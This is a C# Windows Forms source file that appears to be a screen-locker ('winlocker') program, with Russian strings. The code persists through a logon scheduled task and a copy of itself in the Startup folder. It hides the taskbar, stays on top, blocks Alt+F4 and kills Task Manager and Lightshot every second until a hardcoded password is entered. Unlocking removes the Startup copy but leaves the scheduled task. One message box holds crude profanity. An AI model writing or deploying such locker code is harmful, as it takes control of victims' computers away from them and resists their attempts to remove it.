﻿using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32.TaskScheduler;

namespace system
{
    public partial class Form1 : Form
    {
        private bool isCodeValid = false;
        private System.Windows.Forms.Timer mainTimer;
        private System.Windows.Forms.Timer checkProcessTimer;
        private PrivateFontCollection customFonts = new PrivateFontCollection();

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public Form1()
        {
            InitializeComponent();
            InitializeTimers();
            ConfigureFormSettings();
            CreateScheduledTask();
            EnsureStartupCopy();
        }

        private void InitializeTimers()
        {
            mainTimer = new System.Windows.Forms.Timer();
            mainTimer.Tick += MainTimer_Tick;

            checkProcessTimer = new System.Windows.Forms.Timer();
            checkProcessTimer.Interval = 1000;
            checkProcessTimer.Tick += CheckProcessTimer_Tick;
            checkProcessTimer.Start();
        }

        private void ConfigureFormSettings()
        {
            LoadCustomFont();
            ApplyFontToControls();
            label7.Visible = false;
            label8.Visible = false;
            this.ShowInTaskbar = false;
            this.TopMost = true;
            this.ControlBox = false;
            this.KeyPreview = true;

            HideTaskbar();
        }

        private void LoadCustomFont()
        {
            string fontPath = "system.SimplifiedArabicFixed.ttf";

            using (Stream fontStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(fontPath))
            {
                if (fontStream != null)
                {
                    byte[] fontData = new byte[fontStream.Length];
                    fontStream.Read(fontData, 0, (int)fontStream.Length);
                    IntPtr fontPtr = Marshal.AllocCoTaskMem(fontData.Length);
                    Marshal.Copy(fontData, 0, fontPtr, fontData.Length);
                    customFonts.AddMemoryFont(fontPtr, fontData.Length);
                }
                else
                {
                    MessageBox.Show("ПИЗДА ШРИФТУ Я НЕ ЕБУ КАК ФИКСИТЬ!!!!", "негрик i love you <3", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void ApplyFontToControls()
        {
            if (customFonts.Families.Length > 0)
            {
                label1.Font = new Font(customFonts.Families[0], 14.25F, FontStyle.Bold);
            }
        }

        private void CreateScheduledTask()
        {
            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = "Запуск моего приложения при входе в систему";
                td.Triggers.Add(new LogonTrigger());
                td.Actions.Add(new ExecAction(Application.ExecutablePath, null, null));
                ts.RootFolder.RegisterTaskDefinition("MyApp Startup", td);
            }
        }

        private void EnsureStartupCopy()
        {
            string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string currentExePath = Application.ExecutablePath;
            string newFilePath = Path.Combine(startupPath, Path.GetFileName(currentExePath));

            if (!File.Exists(newFilePath))
            {
                File.Copy(currentExePath, newFilePath);
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            isCodeValid = textBox1.Text == "ТУТА ПАРОЛЬ ВВОДИ";
        }

        private void label4_Click(object sender, EventArgs e)
        {
            if (isCodeValid)
            {
                label8.Visible = true;
                mainTimer.Interval = 10000;
                mainTimer.Start();
                ShowTaskbar();
                DelayedRemoveFromStartupFolder();
            }
            else
            {
                label7.Visible = true;
            }
        }

        private void MainTimer_Tick(object sender, EventArgs e)
        {
            mainTimer.Stop();
            Application.Exit();
        }

        protected override void OnKeyDown(KeyEventArgs e)
        {
            if (e.Alt && e.KeyCode == Keys.F4)
            {
                e.Handled = true;
            }
            base.OnKeyDown(e);
        }

        private void HideTaskbar()
        {
            IntPtr taskbarWnd = FindWindow("Shell_TrayWnd", "");
            if (taskbarWnd != IntPtr.Zero)
            {
                ShowWindow(taskbarWnd, SW_HIDE);
            }
        }

        private void ShowTaskbar()
        {
            IntPtr taskbarWnd = FindWindow("Shell_TrayWnd", "");
            if (taskbarWnd != IntPtr.Zero)
            {
                ShowWindow(taskbarWnd, SW_SHOW);
            }
        }

        private void CheckProcessTimer_Tick(object sender, EventArgs e)
        {
            foreach (var process in Process.GetProcesses())
            {
                if (process.ProcessName.Equals("taskmgr", StringComparison.OrdinalIgnoreCase) ||
                    process.ProcessName.Equals("Lightshot", StringComparison.OrdinalIgnoreCase))
                {
                    try
                    {
                        process.Kill();
                        process.WaitForExit();
                        Console.WriteLine($"Завершен процесс: {process.ProcessName}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Ошибка при завершении процесса {process.ProcessName}: {ex.Message}");
                    }
                }
            }
        }

        private async void DelayedRemoveFromStartupFolder()
        {
            await System.Threading.Tasks.Task.Delay(1000);
            RemoveFromStartupFolder();
        }

        private void RemoveFromStartupFolder()
        {
            string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string currentExePath = Application.ExecutablePath;
            string newFilePath = Path.Combine(startupPath, Path.GetFileName(currentExePath));

            if (File.Exists(newFilePath))
            {
                try
                {
                    File.Delete(newFilePath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Ошибка удаления файла: {ex.Message}");
                }
            }
        }

        private void label10_Click(object sender, EventArgs e) { }
        private void label8_Click(object sender, EventArgs e) { }
        private void label7_Click(object sender, EventArgs e) { }
        private void listBox1_SelectedIndexChanged(object sender, EventArgs e) { }
        private void textBoxPCName_TextChanged(object sender, EventArgs e) { }
        private void label10_Click_1(object sender, EventArgs e) { }
        private void textBox2_TextChanged(object sender, EventArgs e) { }
        private void textBoxPCName_TextChanged_1(object sender, EventArgs e) { }
    }
}